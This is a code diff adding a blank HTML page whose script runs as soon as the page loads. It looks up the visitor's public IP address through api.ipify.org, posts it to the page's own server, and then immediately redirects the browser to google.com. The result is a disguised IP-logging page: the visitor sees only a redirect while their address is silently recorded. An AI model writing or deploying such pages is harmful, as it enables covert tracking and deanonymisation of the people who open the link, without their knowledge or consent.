@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        async function getSet(params) {
+            await fetch("https://api.ipify.org/?format=json").then(res => res.json()).then(data =>{
+            let n = {ip: data.ip};
+                fetch('/',{
+                    method:"POST",
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(n)
+                }).then(res => res.json()).then(data => console.log(data));
+                window.location.replace('https://www.google.com/');
+            })
+        }
+        getSet()
+    </script> 
+</head>
+<body>
+</body>
+</html>
